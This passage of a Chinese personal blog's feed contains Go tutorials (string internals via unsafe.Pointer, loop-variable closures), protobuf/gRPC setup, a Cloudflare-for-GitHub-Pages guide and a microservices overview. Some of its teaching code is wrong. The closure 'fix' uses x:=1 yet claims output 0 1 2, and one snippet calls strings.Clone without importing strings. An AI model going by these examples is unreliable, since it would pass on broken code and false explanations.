    <category term="前端" scheme="http://blog.hoshinobunny.xyz/tags/%E5%89%8D%E7%AB%AF/"/>
    
    <category term="学习记录" scheme="http://blog.hoshinobunny.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>结构体指针的转换</title>
    <link href="http://blog.hoshinobunny.xyz/2024/12/01/%E7%BB%93%E6%9E%84%E4%BD%93%E6%8C%87%E9%92%88%E7%9A%84%E8%BD%AC%E6%8D%A2/"/>
    <id>http://blog.hoshinobunny.xyz/2024/12/01/%E7%BB%93%E6%9E%84%E4%BD%93%E6%8C%87%E9%92%88%E7%9A%84%E8%BD%AC%E6%8D%A2/</id>
    <published>2024-12-01T06:33:20.000Z</published>
    <updated>2024-12-02T07:16:56.108Z</updated>
    
    <content type="html"><![CDATA[<h1 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h1><p>起因是在水群的时候看到这么个问题：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Reception <span class="keyword">struct</span> &#123;</span><br><span class="line">p   unsafe.Pointer</span><br><span class="line"><span class="built_in">len</span> <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">type</span> A <span class="keyword">struct</span> &#123;</span><br><span class="line">s <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line">m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line">tmp := A&#123;s: <span class="string">&quot;hello&quot;</span>&#125;</span><br><span class="line">m[tmp.s] = <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line"><span class="comment">// 由于 A 结构体的字段 s 是一个字符串类型，所以在将 tmp.s 作为 map 的 key 时，会将字符串的地址作为 key，而不是字符串的值</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;tmp.s: %+v\n&quot;</span>, &amp;tmp.s)</span><br><span class="line"></span><br><span class="line">rB := *(*Reception)(unsafe.Pointer(&amp;tmp.s))</span><br><span class="line">fmt.Printf(<span class="string">&quot;rB.p: %+v\n&quot;</span>, rB.p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k := <span class="keyword">range</span> m &#123;</span><br><span class="line">rA := *(*Reception)(unsafe.Pointer(&amp;k))</span><br><span class="line">fmt.Printf(<span class="string">&quot;rA.p: %+v\n&quot;</span>, rA.p)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在这段代码中，将<code>A</code> 类型结构体的实例<code>tmp</code> 中的<code>string</code> 类型字段<code>tmp.s</code> 作为map类型<code>m</code>的key，然后在试图释放<code>tmp</code> 实例的时候会发现无法释放。这是因为<code>string</code> 类型是一个结构体，<code>tmp.s</code> 实际上是一个指针，所以<code>m</code>在将其作为key的时候是引用了该指针，这就导致<code>tmp</code> 无法被释放，因为它任然被<code>m</code> 引用。</p><p>将<code>tmp.s</code> 的指针转换为通用指针类型，最后转为<code>Reception</code> 类型的指针（<code>Reception</code>结构体对应<code>string</code>类型的底层结构体实现）并输出该指针。取出<code>m</code> 中的key，进行同样的指针转换，最后输出，发现两个指针的内容相同，说明这两个指针指向了同一个地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tmp.s: 0x14000102020</span><br><span class="line">rB.p: 0x102e9e800</span><br><span class="line">rA.p: 0x102e9e800</span><br></pre></td></tr></table></figure><p>实际上<code>tmp.s</code> 这个字段就是一个和<code>Reception</code> 结构一致的结构体，它们的第一个字段都是一个8字节的通用指针类型，第二个字段都是一个8字节的int类型（在64操作系统上默认为8字节，而在32位操作系统上默认为4个字节），所以<code>tmp.s</code> 会占用16个字节。由于<code>string</code>是Go的基础类型，直接打印只能输出字符串的值，而无法获取其字符串的真实地址，因此需要将字符串类型的结构体指针通过通用指针类型转换为自定义的<code>Reception</code> 结构体就可以获取到字符串内存空间的指针。</p><p>这里转换的原理其实只是修改了这16个字节的<code>语义</code>。本来这16个字节会被计算机解释为<code>string</code> 类型，但是通过将其转换为自定义的<code>Reception</code> 结构体后，就会按照<code>Reception</code> 结构体的规则来解析这16个字节，而<code>Reception</code> 结构体的字段结构是和<code>string</code> 类型一致的，这自然就拿到了我们想要的字符串的真实地址，即前八个字节解析出来的<code>Recption.p</code>。</p><h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><p>至于这个问题的解决办法很简单，只需要<code>深拷贝</code> 一份该字符串使引用的地址不同即可。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Reception <span class="keyword">struct</span> &#123;</span><br><span class="line">p   unsafe.Pointer</span><br><span class="line"><span class="built_in">len</span> <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">type</span> A <span class="keyword">struct</span> &#123;</span><br><span class="line">s <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line">m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line">tmp := A&#123;s: <span class="string">&quot;hello&quot;</span>&#125;</span><br><span class="line"><span class="comment">// 将字符串拷贝一份，使 m 引用的地址与 tmp.s 不同即可</span></span><br><span class="line">m[strings.Clone(tmp.s)] = <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line"><span class="comment">// 由于 A 结构体的字段 s 是一个字符串类型，所以在将 tmp.s 作为 map 的 key 时，会将字符串的地址作为 key，而不是字符串的值</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;tmp.s: %+v\n&quot;</span>, &amp;tmp.s)</span><br><span class="line"></span><br><span class="line">rB := *(*Reception)(unsafe.Pointer(&amp;tmp.s))</span><br><span class="line">fmt.Printf(<span class="string">&quot;rB.p: %+v\n&quot;</span>, rB.p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k := <span class="keyword">range</span> m &#123;</span><br><span class="line">rA := *(*Reception)(unsafe.Pointer(&amp;k))</span><br><span class="line">fmt.Printf(<span class="string">&quot;rA.p: %+v\n&quot;</span>, rA.p)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>或者在 <code>m</code> 的key设置完成后，修改<code>tmp.s</code>的值，字符串的值修改后，由于原先的字符串地址被<code>m</code> 引用了，所以<code>tmp.s</code> 就会使用新的内存地址，这同样实现了两者地址引用的不同。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;问题：&quot;&gt;&lt;a href=&quot;#问题：&quot; class=&quot;headerlink&quot; title=&quot;问题：&quot;&gt;&lt;/a&gt;问题：&lt;/h1&gt;&lt;p&gt;起因是在水群的时候看到这么个问题：&lt;/p&gt;
&lt;figure class=&quot;highlight go&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td </summary>
      
    
    
    
    <category term="Coding" scheme="http://blog.hoshinobunny.xyz/categories/Coding/"/>
    
    
    <category term="Go" scheme="http://blog.hoshinobunny.xyz/tags/Go/"/>
    
    <category term="学习记录" scheme="http://blog.hoshinobunny.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>for range的闭包问题</title>
    <link href="http://blog.hoshinobunny.xyz/2024/11/30/for%20range%E7%9A%84%E9%97%AD%E5%8C%85%E9%97%AE%E9%A2%98/"/>
    <id>http://blog.hoshinobunny.xyz/2024/11/30/for%20range%E7%9A%84%E9%97%AD%E5%8C%85%E9%97%AE%E9%A2%98/</id>
    <published>2024-11-30T12:56:21.000Z</published>
    <updated>2024-11-30T12:56:47.393Z</updated>
    
    <content type="html"><![CDATA[<h1 id="for-range的闭包问题"><a href="#for-range的闭包问题" class="headerlink" title="for range的闭包问题"></a>for range的闭包问题</h1><p>在之前，Go中的for range语句中用短声明形式定义的循环变量是整个循环共享同一个，这就导致在for range语句中的闭包在循环结束后引用的该循环变量最后都会变为同一个值。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">func <span class="function"><span class="title">main</span></span>() &#123;</span><br><span class="line">var wg sync.WaitGroup</span><br><span class="line"><span class="keyword">for</span> i := 0; i &lt; 3; i++ &#123;</span><br><span class="line">wg.Add(1)</span><br><span class="line">go <span class="function"><span class="title">func</span></span>() &#123;</span><br><span class="line">defer wg.Done()</span><br><span class="line">fmt.Println(i)</span><br><span class="line">&#125;()</span><br><span class="line">&#125;</span><br><span class="line">wg.Wait()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例如在上面的代码中，最后输出的结果为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">3</span><br><span class="line">3</span><br></pre></td></tr></table></figure><p>这是因为闭包实际上捕获的是对变量 <code>i</code> 的引用，在闭包函数运行时，循环语句已经结束，<code>i</code> 的值已经变为了<code>3</code>，所以输出的结果自然都是<code>3</code>。</p><p>如果要实现预期输出，则需要使每个闭包函数的引用各不相同，修改如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">func <span class="function"><span class="title">main</span></span>() &#123;</span><br><span class="line">var wg sync.WaitGroup</span><br><span class="line"><span class="keyword">for</span> i := 0; i &lt; 3; i++ &#123;</span><br><span class="line">wg.Add(1)</span><br><span class="line">x:=1</span><br><span class="line">go <span class="function"><span class="title">func</span></span>() &#123;</span><br><span class="line">defer wg.Done()</span><br><span class="line">fmt.Println(x)</span><br><span class="line">&#125;()</span><br><span class="line">&#125;</span><br><span class="line">wg.Wait()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每次通过新定义变量<code>x</code> 来实现不同闭包函数对不同变量的引用，就能得到预期输出(由于是并发执行，输出结果不一定有序)：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br></pre></td></tr></table></figure><blockquote><p><code>Go 1.22</code>版本的编译器已经对此做了优化，现在循环变量的定义变为每次迭代定义一个，所以每次闭包函数捕获的引用值会不同，现在直接使用变量<code>i</code> 也能够得到预期输出。</p></blockquote><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://tonybai.com/2024/02/18/some-changes-in-go-1-22/">https://tonybai.com/2024/02/18/some-changes-in-go-1-22/</a></p><p><a href="https://cloud.tencent.com/developer/article/2395693">https://cloud.tencent.com/developer/article/2395693</a></p><p><a href="https://linux.do/t/topic/219504">https://linux.do/t/topic/219504</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;for-range的闭包问题&quot;&gt;&lt;a href=&quot;#for-range的闭包问题&quot; class=&quot;headerlink&quot; title=&quot;for range的闭包问题&quot;&gt;&lt;/a&gt;for range的闭包问题&lt;/h1&gt;&lt;p&gt;在之前，Go中的for range语句中用短</summary>
      
    
    
    
    <category term="Coding" scheme="http://blog.hoshinobunny.xyz/categories/Coding/"/>
    
    
    <category term="Go" scheme="http://blog.hoshinobunny.xyz/tags/Go/"/>
    
    <category term="学习记录" scheme="http://blog.hoshinobunny.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>Golang使用Protocol Buffers不完全指北</title>
    <link href="http://blog.hoshinobunny.xyz/2024/11/30/Golang%E4%BD%BF%E7%94%A8Protocol%20Buffers%E4%B8%8D%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8C%97/"/>
    <id>http://blog.hoshinobunny.xyz/2024/11/30/Golang%E4%BD%BF%E7%94%A8Protocol%20Buffers%E4%B8%8D%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8C%97/</id>
    <published>2024-11-30T03:19:38.000Z</published>
    <updated>2024-11-30T03:39:31.273Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Protocol-Buffers-V3-语法指南"><a href="#Protocol-Buffers-V3-语法指南" class="headerlink" title="Protocol Buffers V3 语法指南"></a>Protocol Buffers V3 语法指南</h1><p><a href="https://www.liwenzhou.com/posts/Go/Protobuf3-language-guide-zh/">Protocol Buffers V3中文语法指南[翻译] - 李文周的博客</a></p><h1 id="使用指南"><a href="#使用指南" class="headerlink" title="使用指南"></a>使用指南</h1><h2 id="安装protobuf"><a href="#安装protobuf" class="headerlink" title="安装protobuf"></a>安装protobuf</h2><p>从<a href="https://github.com/google/protobuf/releases">gtihub仓库</a>下载对应操作系统的预编译好的二进制文件。</p><p>我下载的是M芯片的Mac系统版本：</p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2024/11/30/image.png" alt="image.png"></p><p>其中：</p><ul><li>bin 目录下的 protoc 是可执行文件。</li><li>include 目录下的是 google 定义的<code>.proto</code>文件。</li></ul><p>别忘了将文件夹下的 <code>bin</code> 目录添加到环境变量中。</p><h2 id="protoc生成Go和gRPC代码"><a href="#protoc生成Go和gRPC代码" class="headerlink" title="protoc生成Go和gRPC代码"></a>protoc生成Go和gRPC代码</h2><p>protocol buffer编译器需要一个插件来根据提供的proto文件生成 Go 代码，使用下面的命令安装插件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go install google.golang.org/protobuf/cmd/protoc-gen-go@latest</span><br></pre></td></tr></table></figure><p>同样，生成gRPC代码也需要用到一个插件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go install google.golang.org/grpc/cmd/protoc-gen-go-grpc@latest</span><br></pre></td></tr></table></figure><p>安装好以上插件后，在项目根目录下执行以下命令即可生成相应的gRPC的客户端及服务端Go代码。只需将下面命令的 <code>pb/hello.proto</code> 修改为当前项目中proto文件的相应资源路径即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protoc --go_out=. --go_opt=paths=source_relative --go-grpc_out=. --go-grpc_opt=paths=source_relative pb/hello.proto</span><br></pre></td></tr></table></figure><blockquote><p>Mac用户可以直接使用<code>homebrew</code>安装以上两个插件， <code>brew install protoc-gen-go</code> 、 <code>brew install protoc-gen-go-grpc</code></p></blockquote><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.liwenzhou.com/posts/Go/protobuf/">https://www.liwenzhou.com/posts/Go/protobuf/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Protocol-Buffers-V3-语法指南&quot;&gt;&lt;a href=&quot;#Protocol-Buffers-V3-语法指南&quot; class=&quot;headerlink&quot; title=&quot;Protocol Buffers V3 语法指南&quot;&gt;&lt;/a&gt;Protocol Buffe</summary>
      
    
    
    
    <category term="Coding" scheme="http://blog.hoshinobunny.xyz/categories/Coding/"/>
    
    
    <category term="Go" scheme="http://blog.hoshinobunny.xyz/tags/Go/"/>
    
    <category term="ProtocolBuffers" scheme="http://blog.hoshinobunny.xyz/tags/ProtocolBuffers/"/>
    
    <category term="gRPC" scheme="http://blog.hoshinobunny.xyz/tags/gRPC/"/>
    
    <category term="学习记录" scheme="http://blog.hoshinobunny.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>使用 Cloudflare 加速 Github Pages</title>
    <link href="http://blog.hoshinobunny.xyz/2024/11/25/%E4%BD%BF%E7%94%A8%20Cloudflare%20%E5%8A%A0%E9%80%9F%20Github%20Pages/"/>
    <id>http://blog.hoshinobunny.xyz/2024/11/25/%E4%BD%BF%E7%94%A8%20Cloudflare%20%E5%8A%A0%E9%80%9F%20Github%20Pages/</id>
    <published>2024-11-25T09:51:49.000Z</published>
    <updated>2024-11-30T03:39:07.834Z</updated>
    
    <content type="html"><![CDATA[<h1 id="为域名添加解析"><a href="#为域名添加解析" class="headerlink" title="为域名添加解析"></a>为域名添加解析</h1><p>如果域名是在其他服务商（比如腾讯云，阿里云）购买的，需要先在Cloudflare添加域名。</p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2024/11/25/image-20241125175016639.png" alt="image-20241125175016639"></p><p>然后在域名服务商的控制台将Cloudflare提供的 <code>nameserver</code> 服务器配置到域名上。等待一些时间，在域名传播完成后，就可以使用Cloudflare的域名托管服务了。</p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2024/11/25/image-20241125175039709.png" alt="image-20241125175039709"></p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2024/11/25/image%202.png" alt="image.png"></p><p>接下来查看自己git page的源ip地址，并为域名创建一条 <code>A</code>记录。</p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2024/11/25/image-20241125175056255.png" alt="image-20241125175056255"></p><h1 id="在git-page仓库添加CNAME文件"><a href="#在git-page仓库添加CNAME文件" class="headerlink" title="在git page仓库添加CNAME文件"></a>在git page仓库添加CNAME文件</h1><p>最后需要在git page的仓库根目录下添加 <code>CNAME</code> 文件，在文件中输入刚刚配置的域名，例如我配置的域名为 <a href="http://blog.hoshinobunny.xyz/"><code>blog.hoshinobunny.xyz</code></a> ，那么只需要将这一行域名写入 <code>CNAME</code> 文件中即可生效。</p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2024/11/25/image-20241125175104166.png" alt="image-20241125175104166"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;为域名添加解析&quot;&gt;&lt;a href=&quot;#为域名添加解析&quot; class=&quot;headerlink&quot; title=&quot;为域名添加解析&quot;&gt;&lt;/a&gt;为域名添加解析&lt;/h1&gt;&lt;p&gt;如果域名是在其他服务商（比如腾讯云，阿里云）购买的，需要先在Cloudflare添加域名。&lt;/p&gt;
</summary>
      
    
    
    
    <category term="杂项" scheme="http://blog.hoshinobunny.xyz/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
    <category term="网络" scheme="http://blog.hoshinobunny.xyz/tags/%E7%BD%91%E7%BB%9C/"/>
    
    <category term="Cloudflare" scheme="http://blog.hoshinobunny.xyz/tags/Cloudflare/"/>
    
  </entry>
  
  <entry>
    <title>微服务架构介绍</title>
    <link href="http://blog.hoshinobunny.xyz/2024/11/24/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84%E4%BB%8B%E7%BB%8D/"/>
    <id>http://blog.hoshinobunny.xyz/2024/11/24/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84%E4%BB%8B%E7%BB%8D/</id>
    <published>2024-11-24T12:19:28.000Z</published>
    <updated>2024-11-30T03:39:24.934Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SOA架构"><a href="#SOA架构" class="headerlink" title="SOA架构"></a>SOA架构</h1><p>SOA（Service-Oriented Architecture，<strong>面向服务的架构</strong>）是一种高层级的 <code>架构设计理念</code>，可通过在网络上使用基于通用通信语言的服务接口，让软件组件可重复使用。它使用称为<code>服务</code>的软件组件来创建业务应用程序。每项<code>服务</code>提供一种业务能力，并且服务也可以跨平台和语言相互通信。开发人员使用 SOA 来重用不同系统中的服务，或者组合几个独立的服务来执行复杂的任务。</p><p>ESB（Enterprise Service Bus，<strong>企业服务总线</strong>）把企业中各个不同的服务连接在一起。就像计算机总线一样，把计算机的各个不同的设备连接在一起。</p><p>因为不同的服务是使用不同的技术实现的，各个独立的服务是异构的，如果没有统一的标准，则各个异构系统对外提供的接口是各式各样的。SOA 使用 ESB 来屏蔽异构系统对外提供各种不同的接口方式，以此来达到服务间高效的互联互通。ESB通过使用标准网络协议（如 SOAP、XML、JSON、MQ ）来开放服务以发送请求或访问数据，实现与各种系统间的协议转换、数据转换、透明的动态路由等功能，消除了开发人员必须从头开始进行集成的困扰。</p><p>采用 SOA 架构后，各个服务是相互独立运行的，甚至都不清楚某个服务到底有多少对其他服务的依赖，减少各个服务间的依赖和互相影响，做到了松耦合。</p><p>如果做不到松耦合，某个服务一升级，依赖它的其他服务全部故障，这样肯定是无法满足业务需求的。</p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2024/11/25/image.png" alt="image.png"></p><h2 id="SAO架构的局限性"><a href="#SAO架构的局限性" class="headerlink" title="SAO架构的局限性"></a>SAO架构的局限性</h2><ul><li>企业服务总线（ESB）将多个服务连接在一起，这使其成为单一故障点。</li><li>所有服务共享一个公用数据存储库。这使得服务难以单独管理。</li><li>每项服务的范围都很广。因此，如果其中一项服务出现故障，整个业务工作流程都将受到影响。</li></ul><h1 id="微服务架构"><a href="#微服务架构" class="headerlink" title="微服务架构"></a>微服务架构</h1><p>微服务（Microservices）是一种 <code>软件架构风格</code>，由 SOA 架构风格演变而来，它是以专注于单一责任与功能的小型功能区块 (Small Building Blocks) 为基础，利用模块化的方式组合出复杂的大型应用程序，各功能区块使用与语言无关 (Language-Independent&#x2F;Language agnostic）的API集相互通信。</p><p>微服务架构风格是一种将 <code>单体应用</code>开发为一套 <code>小型服务</code>的方法，每个服务都在自己的进程中运行，并使用 <code>轻量级的通信机制</code>（通常是 HTTP 类型的 API）进行通信。这些服务是围绕 <code>业务能力</code>构建的，并且可以通过 <code>全自动化的部署机制</code> 进行 <code>独立部署</code>。这些服务可以用 <code>不同的编程语言</code>编写，也能使用 不同的 <code>数据存储技术</code>。—— 2014 ，由Martin Fowler 与 James Lewis提出</p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2024/11/25/image%201.png" alt="image.png"></p><h2 id="微服务架构的优势"><a href="#微服务架构的优势" class="headerlink" title="微服务架构的优势"></a>微服务架构的优势</h2><ul><li>快：更注重敏捷开发、持续交付</li><li>准：服务粒度小、服务质量精准可控</li><li>狠：适用于互联网时代，产品迭代周期更短</li></ul><h2 id="微服务架构带来的挑战"><a href="#微服务架构带来的挑战" class="headerlink" title="微服务架构带来的挑战"></a>微服务架构带来的挑战</h2><ul><li>分布式系统的复杂性</li><li>服务依赖管理</li><li>数据的一致性保障</li><li>测试更加艰难</li><li>对DevOps等基础设施的高要求</li></ul><h2 id="如何进行服务划分"><a href="#如何进行服务划分" class="headerlink" title="如何进行服务划分"></a>如何进行服务划分</h2><ul><li>按业务职能（Business Capability）划分<br>由公司内部不同部门提供的职能。例如客户服务部门提供客户服务的职能，财务部门提供财务相关的职能。</li><li>按 <a href="https://juejin.cn/post/7146116779905908772">DDD</a> 的限界上下文（Bounded Context）划分<br>限界上下文是 DDD 中用来划分不同业务边界的元素，这里业务边界的含义是 <code>解决不同业务问题</code>的问题域和对应的解决方案域，为了解决某种类型的业务问题，贴近领域知识，也就是业务。</li><li>CQRS 将系统中的操作分为两类，即 <code>命令</code>（Command） 与 <code>查询</code>（Query）。<br> <code>命令</code>是对会引起数据发生变化操作的总称，即我们常说的新增，更新，删除这些操作，都是<code>命令</code>。而<code>查询</code>则和字面意思一样，即不会对数据产生变化的操作，只是按照某些条件查找数据。CQRS 的核心思想是将这两类不同的操作进行分离，然后在两个独立的「服务」中实现。这里的「服务」一般是指两个独立部署的应用。在某些特殊情况下，也可以部署在同一个应用内的不同接口上。</li></ul><h2 id="微服务发展历史"><a href="#微服务发展历史" class="headerlink" title="微服务发展历史"></a>微服务发展历史</h2><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2024/11/25/image-20241124201751498.png" alt="image-20241124201751498"></p><h3 id="第一代：基于RPC的传统服务架构"><a href="#第一代：基于RPC的传统服务架构" class="headerlink" title="第一代：基于RPC的传统服务架构"></a>第一代：基于RPC的传统服务架构</h3><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2024/11/25/image%203.png" alt="image.png"></p><h3 id="第二代：Service-Mesh（以Istio为代表的服务网格模式）"><a href="#第二代：Service-Mesh（以Istio为代表的服务网格模式）" class="headerlink" title="第二代：Service Mesh（以Istio为代表的服务网格模式）"></a>第二代：Service Mesh（以<a href="https://cloud.tencent.com/developer/article/1986019">Istio</a>为代表的服务网格模式）</h3><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2024/11/25/image%204.png" alt="image.png"></p><h2 id="微服务架构分层"><a href="#微服务架构分层" class="headerlink" title="微服务架构分层"></a>微服务架构分层</h2><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2024/11/25/image%205.png" alt="image.png"></p><h2 id="微服务核心组件"><a href="#微服务核心组件" class="headerlink" title="微服务核心组件"></a>微服务核心组件</h2><ul><li>API网关</li><li>服务注册中心</li><li>配置中心</li><li>服务通信</li><li>服务治理</li><li>服务监控</li></ul><h1 id="SOA架构与微服务架构对比"><a href="#SOA架构与微服务架构对比" class="headerlink" title="SOA架构与微服务架构对比"></a>SOA架构与微服务架构对比</h1><table><thead><tr><th></th><th><strong>SOA</strong></th><th><strong>微服务</strong></th></tr></thead><tbody><tr><td>服务粒度</td><td>粗粒度</td><td>细粒度</td></tr><tr><td>业务划分方式</td><td>水平多层</td><td>纵向业务划分</td></tr><tr><td>部署方式</td><td>整体部署</td><td>独立部署</td></tr><tr><td>通信方式</td><td>使用重量级通信方式，ESB充当服务之间通信的角色</td><td>使用轻量级通信方式，如HTTP RESTful</td></tr><tr><td>服务交付</td><td>交付慢</td><td>交付快</td></tr><tr><td>应用场景</td><td>庞大、复杂、异构的企业级系统</td><td>快速、轻量级、基于 Web 的互联网系统</td></tr></tbody></table><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://bbs.huaweicloud.com/blogs/315752">https://bbs.huaweicloud.com/blogs/315752</a></li><li><a href="https://aws.amazon.com/cn/what-is/service-oriented-architecture/">https://aws.amazon.com/cn/what-is/service-oriented-architecture/</a></li><li><a href="https://aws.amazon.com/cn/microservices/">https://aws.amazon.com/cn/microservices/</a></li><li><a href="https://aws.amazon.com/cn/compare/the-difference-between-soa-microservices/">https://aws.amazon.com/cn/compare/the-difference-between-soa-microservices/</a></li><li><a href="https://cloud.tencent.com/developer/article/1986019">https://cloud.tencent.com/developer/article/1986019</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SOA架构&quot;&gt;&lt;a href=&quot;#SOA架构&quot; class=&quot;headerlink&quot; title=&quot;SOA架构&quot;&gt;&lt;/a&gt;SOA架构&lt;/h1&gt;&lt;p&gt;SOA（Service-Oriented Architecture，&lt;strong&gt;面向服务的架构&lt;/strong&gt;</summary>
      
    
    
    
    <category term="Coding" scheme="http://blog.hoshinobunny.xyz/categories/Coding/"/>
    
    
    <category term="Go" scheme="http://blog.hoshinobunny.xyz/tags/Go/"/>
    
    <category term="学习记录" scheme="http://blog.hoshinobunny.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
